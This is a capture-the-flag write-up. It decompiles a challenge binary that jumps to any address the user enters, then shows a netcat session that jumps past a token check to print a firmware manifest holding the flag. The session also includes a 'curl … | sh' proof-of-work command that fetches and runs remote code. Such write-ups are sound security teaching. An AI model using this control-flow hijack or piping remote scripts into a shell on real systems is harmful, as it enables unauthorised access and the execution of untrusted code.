# Day 07

Decompile:

```cpp
int __fastcall main(int argc, const char **argv, const char **envp)
{
  int v3; // edx
  int v4; // ecx
  int v5; // r8d
  int v6; // r9d
  int v7; // edx
  int v8; // ecx
  int v9; // r8d
  int v10; // r9d
  _QWORD v12[3]; // [rsp+8h] [rbp-18h] BYREF

  v12[2] = __readfsqword(0x28u);
  setbuf(stdout, 0, envp);
  _printf((unsigned int)"DRONE FIRMWARE DEBUG CONSOLE> ", 0, v3, v4, v5, v6);
  if ( (unsigned int)_isoc99_scanf((unsigned int)"%lx", (unsigned int)v12, v7, v8, v9, v10) == 1 )
  {
    v12[1] = v12[0];
    ((void (*)(void))v12[0])();
    return 0;
  }
  else
  {
    IO_puts("ERROR, shutting down.");
    return 1;
  }
}

unsigned __int64 __fastcall nav_core(int a1)
{
  char v2; // [rsp+0h] [rbp-130h]
  int v3; // [rsp+14h] [rbp-11Ch]
  __int64 v4; // [rsp+18h] [rbp-118h]
  _BYTE v5[264]; // [rsp+20h] [rbp-110h] BYREF
  unsigned __int64 v6; // [rsp+128h] [rbp-8h]

  v6 = __readfsqword(0x28u);
  if ( a1 == '\f\f\n' )
  {
    v3 = _open("manifest.bin", 0, v2);
    if ( v3 >= 0 )
    {
      v4 = _libc_read((unsigned int)v3, v5, 255);
      if ( v4 > 0 )
      {
        v5[v4] = 0;
        _libc_write(1, v5, v4);
      }
      else
      {
        IO_puts("Error reading navigation manifest.");
      }
    }
    else
    {
      IO_puts("Navigation manifest not found.");
    }
  }
  else
  {
    IO_puts("Invalid navigation token.");
  }
  return v6 - __readfsqword(0x28u);
}
```

We can input a hex address, and it will jump to it. There is a `nav_core` function that reads `manifest.bin` and prints its content. However, it has a check in front. We can jump over the check to bypass the validation:

```shell
$ nc ctf.csd.lol 1001
proof of work:
curl -sSfL https://pwn.red/pow | sh -s s.AAAAAw==.7Qe+sjp8kYhKTvtXTUELaQ==
solution: s.PEHh1r8vkfj9b77MVH+BKR48Kfi9nkkPkZwdE0XiKxrmKQvbYzIyzKDEsX+0oh5skfUsaixCtlQ1/6PHz3pG72K5TyzrSRsYkYEE98jJyd7aJAlup4eM2oQrdzGMbTtTZArAGjRE5BmGXXOPrPSCFgjqkoBxB5kEnN+XJZ4vjwFTJTttL+cX52MEfAr7g39WpCAKxZNSGjp5OUsJDJpVgA==
DRONE FIRMWARE DEBUG CONSOLE> 401989
KDNU3B-MANIFEST
format_version=2
fw_family=KDNU-DRONE-NAV
fw_id=kdnu3b-nav-autopilot
fw_version=1.7.24
build_branch=krampus-prod
build_id=2024-12-01T23:41:09Z
signing_key_id=NP-HSM-KEY-07
region_lock=GLOBAL
min_bootloader=0x00020005
image_offset=0x00004000
image_size=00036F80
hash_algo=sha256
image_hash=5f4c3f7d8f0b2737c0f5fd8e8da41c6b9e1372cbe9c6760e5d8e9e4f3d7c9b21
telemetry_profile=KDNU3B-TM-v4
calibration_profile=csd{3Asy_F1rmWAr3_HACk1N9_Fr}
failsafe_mode=HARD_LOCKDOWN
debug_build=false
secure_boot=true
seal_status=SEALED
```
